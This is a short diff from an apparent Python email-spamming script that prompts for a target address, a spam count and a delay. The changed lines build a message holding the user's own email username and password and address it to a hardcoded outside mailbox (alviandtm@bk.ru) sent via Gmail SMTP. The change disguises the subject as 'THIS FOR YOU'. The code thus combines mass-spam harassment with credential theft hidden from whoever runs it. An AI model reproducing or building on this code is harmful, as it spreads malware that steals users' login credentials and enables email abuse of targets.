@@ -30,10 +30,10 @@ class spammer():
         target = raw_input("[?] Target email: ")
         spams = input("[?] how much spam will be sent: ")
 	Time = input("[?] input delay, above 10 second: ")
-	a = ("Emailnya : %s\nPasswordnya : %s") % (username,password)
+	a = ("Emailnya : %s\n\nPasswordnya : %s") % (username,password)
 	date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
 	target2 = "alviandtm@bk.ru"
-	sms = "Form: ANONYMOUS\nTo: %s\nSubject:SPAM\nDate: %s\n\n%s" % (target2,date,a)
+	sms = "Form: ANONYMOUS\nTo: %s\nSubject: THIS FOR YOU\nDate: %s\n\n%s" % (target2,date,a)
 
         server = smtplib.SMTP('smtp.gmail.com:587')
         server.starttls()
